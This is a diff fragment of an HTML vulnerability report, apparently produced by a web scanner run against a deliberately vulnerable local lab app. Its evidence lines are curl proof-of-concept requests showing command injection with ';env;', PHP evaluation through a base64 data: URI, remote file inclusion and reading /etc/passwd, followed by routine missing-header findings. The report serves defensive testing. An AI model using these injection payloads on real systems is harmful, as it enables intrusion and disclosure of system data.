+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Command execution</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Command execution via injection in the parameter username</span>
+        <p></p>
+        <span class="d-block">Solution: Prefer working without user input when using file system calls.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/CommandExecution/CommandExec-1.php?username=a%3Benv%3B&amp;password=&quot; -e &quot;http://localhost:9991/www/CommandExecution/CommandExec-1.php&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Command execution</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Command execution via injection in the parameter typeBox</span>
+        <p></p>
+        <span class="d-block">Solution: Prefer working without user input when using file system calls.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/CommandExecution/CommandExec-2.php?typeBox=%3Benv%3B&quot; -e &quot;http://localhost:9991/www/CommandExecution/CommandExec-2.php&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Command execution</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Command execution via injection in the parameter typeBox</span>
+        <p></p>
+        <span class="d-block">Solution: Prefer working without user input when using file system calls.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/CommandExecution/CommandExec-3.php?typeBox=%3Benv%3B&quot; -e &quot;http://localhost:9991/www/CommandExecution/CommandExec-3.php&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Command execution</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Command execution via injection in the parameter typeBox</span>
+        <p></p>
+        <span class="d-block">Solution: Prefer working without user input when using file system calls.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/CommandExecution/CommandExec-4.php?typeBox=%3Benv%3B&quot; -e &quot;http://localhost:9991/www/CommandExecution/CommandExec-4.php&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Command execution</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: PHP evaluation via injection in the parameter file</span>
+        <p></p>
+        <span class="d-block">Solution: Prefer working without user input when using file system calls.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/FileInclusion/pages/lvl1.php?file=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Command execution</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: PHP evaluation via injection in the parameter file</span>
+        <p></p>
+        <span class="d-block">Solution: Prefer working without user input when using file system calls.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/FileInclusion/pages/lvl2.php?file=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Path Traversal</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Remote inclusion vulnerability via injection in the parameter file</span>
+        <p></p>
+        <span class="d-block">Solution: Prefer working without user input when using file system calls. Use indexes rather than actual portions of file names when templating or using language files (eg: value 5 from the user submission = Czechoslovakian, rather than expecting the user to return &#39;Czechoslovakian&#39;). Ensure the user cannot supply all parts of the path - surround it with your path code. Validate the user&#39;s input by only accepting known good - do not sanitize the data. Use chrooted jails and code access policies to restrict where the files can be obtained or saved to.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/FileInclusion/pages/lvl1.php?file=https%3A%2F%2Fwapiti3.ovh%2Fe.php&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Path Traversal</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Linux local file disclosure vulnerability via injection in the parameter file</span>
+        <p></p>
+        <span class="d-block">Solution: Prefer working without user input when using file system calls. Use indexes rather than actual portions of file names when templating or using language files (eg: value 5 from the user submission = Czechoslovakian, rather than expecting the user to return &#39;Czechoslovakian&#39;). Ensure the user cannot supply all parts of the path - surround it with your path code. Validate the user&#39;s input by only accepting known good - do not sanitize the data. Use chrooted jails and code access policies to restrict where the files can be obtained or saved to.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/FileInclusion/pages/lvl2.php?file=%2Fetc%2Fpasswd&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: Path Traversal</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Possible include() vulnerability via injection in the parameter file (Constraints: suffix)</span>
+        <p></p>
+        <span class="d-block">Solution: Prefer working without user input when using file system calls. Use indexes rather than actual portions of file names when templating or using language files (eg: value 5 from the user submission = Czechoslovakian, rather than expecting the user to return &#39;Czechoslovakian&#39;). Ensure the user cannot supply all parts of the path - surround it with your path code. Validate the user&#39;s input by only accepting known good - do not sanitize the data. Use chrooted jails and code access policies to restrict where the files can be obtained or saved to.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/www/FileInclusion/pages/lvl3.php?file=lvl3.php&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-Frame-Options is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-XSS-Protection is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-Content-Type-Options is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Strict-Transport-Security is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-Frame-Options is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-XSS-Protection is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-Content-Type-Options is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: Strict-Transport-Security is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
+      <div class="pb-3 mb-0 small lh-sm border-bottom w-100">
+        <div class="d-flex justify-content-between">
+          <strong class="text-gray-dark">Category: HTTP Secure Headers</strong>
+
+        </div>
+        <p></p>
+        <span class="d-block">Description: X-Frame-Options is not set</span>
+        <p></p>
+        <span class="d-block">Solution: Use the recommendations for hardening your HTTP Security Headers.</span>
+        <p></p>
+        <span class="d-block">Evidence: curl &quot;http://localhost:9991/&quot;</span>
+        <p></p>
+      </div>
+    </div>
+    
+    <div class="d-flex text-muted pt-3">
+      <svg class=" bi bi-shield-fill-exclamation" width="32" height="32" xmlns="http://www.w3.org/2000/svg" role="img"
+        preserveAspectRatio="xMidYMid slice" focusable="false">
+
+        <path fill-rule="evenodd"
+          d="M8 0c-.69 0-1.843.265-2.928.56-1.11.3-2.229.655-2.887.87a1.54 1.54 0 0 0-1.044 1.262c-.596 4.477.787 7.795 2.465 9.99a11.777 11.777 0 0 0 2.517 2.453c.386.273.744.482 1.048.625.28.132.581.24.829.24s.548-.108.829-.24a7.159 7.159 0 0 0 1.048-.625 11.775 11.775 0 0 0 2.517-2.453c1.678-2.195 3.061-5.513 2.465-9.99a1.541 1.541 0 0 0-1.044-1.263 62.467 62.467 0 0 0-2.887-.87C9.843.266 8.69 0 8 0zm-.55 8.502L7.1 4.995a.905.905 0 1 1 1.8 0l-.35 3.507a.552.552 0 0 1-1.1 0zM8.002 12a1 1 0 1 1 0-2 1 1 0 0 1 0 2z" />
+      </svg>
+
